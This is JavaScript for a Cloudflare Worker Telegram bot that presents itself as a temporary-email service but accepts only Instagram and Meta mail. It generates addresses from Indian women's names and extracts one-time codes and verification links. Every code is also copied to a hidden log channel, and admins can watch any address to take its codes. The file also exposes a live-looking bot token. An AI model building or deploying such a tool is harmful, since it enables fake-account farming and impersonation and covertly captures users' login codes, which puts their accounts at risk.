/**
 * Classic Temp Mail Style UI Engine
 * Domain: vibepulsemedia.online
 */

const BOT_TOKEN = "8943075720:AAE4URhun0DS0yc38zUsHr1J2tGO3Kih3cA";
let PRIMARY_OWNER_ID = "8452322818";
const DB_CHANNEL_ID = "-1004474665956";
const DOMAIN = "vibepulsemedia.online";

let ADMINS = new Set([PRIMARY_OWNER_ID.toString()]);
let ADMIN_WATCHED_EMAILS = new Map();

// Strict Meta & Instagram Filter
const ALLOWED_SENDERS = [
  "instagram.com",
  "mail.instagram.com",
  "facebookmail.com",
  "meta.com",
  "support.facebook.com",
  "meta.ai"
];

const FEMALE_NAMES = [
  "priya", "ananya", "sneha", "pooja", "neha", "riya", "simran", "kajal",
  "khushi", "aditi", "shreya", "tanvi", "mansi", "divya", "muskan", "aarushi",
  "ishika", "sakshi", "pallavi", "swati", "anjali", "kriti", "megha", "komal",
  "sonam", "preeti", "jyoti", "rekha", "payal", "varsha", "shikha", "nisha"
];

const SURNAMES = [
  "sharma", "verma", "singh", "patel", "kumar", "yadav", "gupta", "mishra",
  "tiwari", "pandey", "chauhan", "joshi", "jha", "mehta", "das", "dubey"
];

export default {
  async fetch(request, env, ctx) {
    if (request.method !== "POST") return new Response("OK", { status: 200 });

    try {
      const update = await request.json();
      if (update.message) {
        await handleMessage(update.message);
      } else if (update.callback_query) {
        await handleCallback(update.callback_query);
      }
      return new Response("OK", { status: 200 });
    } catch (err) {
      return new Response("Error: " + err.message, { status: 500 });
    }
  },

  async email(message, env, ctx) {
    try {
      const fromEmail = (message.from || "").toLowerCase().trim();
      const toEmail = (message.to || "").toLowerCase().trim();

      const isAllowed = ALLOWED_SENDERS.some(d => fromEmail.endsWith(d) || fromEmail.includes(d));
      if (!isAllowed) return;

      const rawStream = message.raw;
      const reader = rawStream.getReader();
      let rawContent = "";
      const decoder = new TextDecoder("utf-8");

      while (true) {
        const { done, value } = await reader.read();
        if (done) break;
        rawContent += decoder.decode(value, { stream: true });
      }

      const cleanBody = parseEmailContent(rawContent);

      // Deep OTP match
      const otpRegex = /(?:code|otp|pin|security)[\s:=–-]{1,6}(\b\d{6}\b)/i;
      const otpMatch = cleanBody.match(otpRegex) || cleanBody.match(/\b\d{6}\b/);
      const extractedOtp = otpMatch ? (otpMatch[1] || otpMatch[0]) : null;

      // Link finder
      const linkRegex = /(https?:\/\/[^\s<>"{}|\\^`]+(?:instagram\.com|facebook\.com|meta\.com)[^\s<>"{}|\\^`]*)/i;
      const linkMatch = cleanBody.match(linkRegex);
      const verifyLink = linkMatch ? linkMatch[0] : null;

      const localPart = toEmail.split("@")[0];
      let targetChatId = null;
      let isSystemMail = false;

      if (ADMIN_WATCHED_EMAILS.has(toEmail)) {
        targetChatId = ADMIN_WATCHED_EMAILS.get(toEmail);
        isSystemMail = true;
      } else if (localPart.includes("x")) {
        const potentialId = localPart.split("x")[0];
        if (/^\d+$/.test(potentialId)) targetChatId = potentialId;
      }

      if (!targetChatId) isSystemMail = true;

      if (isSystemMail) {
        for (const adminId of ADMINS) {
          await sendTempMailNotification(adminId, toEmail, extractedOtp, verifyLink, true);
        }
      } else if (targetChatId) {
        await sendTempMailNotification(targetChatId, toEmail, extractedOtp, verifyLink, false);
      }

      if (DB_CHANNEL_ID) {
        await callTelegram("sendMessage", {
          chat_id: DB_CHANNEL_ID,
          text: `Log: \`${toEmail}\` | OTP: \`${extractedOtp || "Link"}\``,
          parse_mode: "Markdown"
        });
      }
    } catch (e) {
      console.error("Email Error: " + e.message);
    }
  }
};

// Temp-Mail Notification Layout
async function sendTempMailNotification(chatId, toEmail, otp, link, isAdmin) {
  let text = `📬 *INBOX (1 New Message)*\n`;
  text += `━━━━━━━━━━━━━━━━━━━━━\n`;
  text += `📧 *Mailbox:* \`${toEmail}\`\n\n`;

  if (otp) {
    text += `🔑 *OTP CODE:*\n`;
    text += `👉 \`${otp}\` 👈\n\n`;
    text += `_(Tap to copy code)_\n`;
  }

  text += `━━━━━━━━━━━━━━━━━━━━━`;

  let buttons = [];
  if (link) {
    buttons.push([{ text: "🔗 Open Verification Link", url: link }]);
  }
  buttons.push([
    { text: "🔄 Change Email", callback_data: "action_change" },
    { text: "🗑 Delete", callback_data: "action_delete" }
  ]);

  await callTelegram("sendMessage", {
    chat_id: chatId,
    text: text,
    parse_mode: "Markdown",
    reply_markup: { inline_keyboard: buttons }
  });
}

// Telegram Command Logic
async function handleMessage(msg) {
  const chatId = msg.chat.id.toString();
  const text = (msg.text || "").trim();
  const isOwner = (chatId === PRIMARY_OWNER_ID.toString());
  const isAdmin = ADMINS.has(chatId) || isOwner;

  if (text.startsWith("/transferowner") && isOwner) {
    const target = text.split(" ")[1];
    if (target && /^\d+$/.test(target)) {
      PRIMARY_OWNER_ID = target.trim();
      ADMINS.add(target.trim());
      await callTelegram("sendMessage", { chat_id: chatId, text: `👑 Owner set to: \`${target}\``, parse_mode: "Markdown" });
    }
    return;
  }

  if (text.startsWith("/addadmin") && isOwner) {
    const target = text.split(" ")[1];
    if (target && /^\d+$/.test(target)) {
      ADMINS.add(target.trim());
      await callTelegram("sendMessage", { chat_id: chatId, text: `✅ Admin added: \`${target}\``, parse_mode: "Markdown" });
    }
    return;
  }

  if (text.startsWith("/watch") && isAdmin) {
    const target = text.split(" ")[1];
    if (target && target.includes("@")) {
      ADMIN_WATCHED_EMAILS.set(target.toLowerCase().trim(), chatId);
      await callTelegram("sendMessage", { chat_id: chatId, text: `🎯 Watching: \`${target.toLowerCase().trim()}\``, parse_mode: "Markdown" });
    }
    return;
  }

  // Classic Temp Mail Screen on /start or /gen
  if (text === "/start" || text === "/gen") {
    await renderTempMailDashboard(chatId, false, null, isAdmin);
  } else if (text === "/id") {
    await callTelegram("sendMessage", { chat_id: chatId, text: `Your ID: \`${chatId}\``, parse_mode: "Markdown" });
  }
}

// Callback Engine (Buttons)
async function handleCallback(query) {
  const chatId = query.message.chat.id.toString();
  const messageId = query.message.message_id;
  const data = query.data;
  const isOwner = (chatId === PRIMARY_OWNER_ID.toString());
  const isAdmin = ADMINS.has(chatId) || isOwner;

  await callTelegram("answerCallbackQuery", { callback_query_id: query.id });

  if (data === "action_change") {
    await renderTempMailDashboard(chatId, true, messageId, isAdmin);
  } 
  else if (data === "action_refresh") {
    await callTelegram("answerCallbackQuery", { 
      callback_query_id: query.id, 
      text: "Inbox checked. No new mail!", 
      show_alert: false 
    });
  } 
  else if (data === "action_delete") {
    await renderTempMailDashboard(chatId, true, messageId, isAdmin);
  }
  else if (data === "admin_hub" && isAdmin) {
    const hubText = 
      `🔐 *Old & Root Mailbox Hub*\n\n` +
      `System emails ke verification codes yahan auto receive hote hain.\n\n` +
      `Specific mail monitor command:\n` +
      `\`/watch name@${DOMAIN}\``;

    const btns = [[{ text: "🔙 Back", callback_data: "action_change" }]];
    await callTelegram("editMessageText", {
      chat_id: chatId,
      message_id: messageId,
      text: hubText,
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: btns }
    });
  }
}

// Classic Temp-Mail Dashboard Card
async function renderTempMailDashboard(chatId, isEdit = false, messageId = null, isAdmin = false) {
  const email = generateFemaleEmail(chatId);

  let text = `📬 *YOUR TEMPORARY EMAIL ADDRESS*\n`;
  text += `━━━━━━━━━━━━━━━━━━━━━\n\n`;
  text += `\`${email}\`\n\n`;
  text += `_(Tap email to copy)_\n`;
  text += `━━━━━━━━━━━━━━━━━━━━━\n`;
  text += `Status: 🟢 *Waiting for incoming mail...*`;

  let buttons = [
    [
      { text: "🔄 Change Email", callback_data: "action_change" },
      { text: "📬 Refresh", callback_data: "action_refresh" }
    ],
    [
      { text: "🗑 Delete", callback_data: "action_delete" }
    ]
  ];

  if (isAdmin) {
    buttons.push([{ text: "🔑 Old Email Hub", callback_data: "admin_hub" }]);
  }

  if (isEdit && messageId) {
    await callTelegram("editMessageText", {
      chat_id: chatId,
      message_id: messageId,
      text: text,
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: buttons }
    });
  } else {
    await callTelegram("sendMessage", {
      chat_id: chatId,
      text: text,
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: buttons }
    });
  }
}

function generateFemaleEmail(chatId) {
  const first = FEMALE_NAMES[Math.floor(Math.random() * FEMALE_NAMES.length)];
  const last = SURNAMES[Math.floor(Math.random() * SURNAMES.length)];
  const num = Math.floor(1000 + Math.random() * 9000);
  const sep = Math.random() > 0.5 ? "." : "";
  const randomUser = `${first}${sep}${last}${num}`;
  return `${chatId}x${randomUser}@${DOMAIN}`;
}

function parseEmailContent(raw) {
  const parts = raw.split(/\r?\n\r?\n/);
  let text = parts.slice(1).join("\n\n");
  text = text.replace(/<style[^>]*>[\s\S]*?<\/style>/gi, "");
  text = text.replace(/<script[^>]*>[\s\S]*?<\/script>/gi, "");
  text = text.replace(/<[^>]+>/g, " ");
  text = text.replace(/&nbsp;/g, " ");
  text = text.replace(/&amp;/g, "&");
  text = text.replace(/&quot;/g, '"');
  text = text.replace(/&lt;/g, "<");
  text = text.replace(/&gt;/g, ">");
  text = text.replace(/=\r?\n/g, "");
  text = text.replace(/\s{2,}/g, " ").trim();
  return text;
}

async function callTelegram(method, payload) {
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  });
}
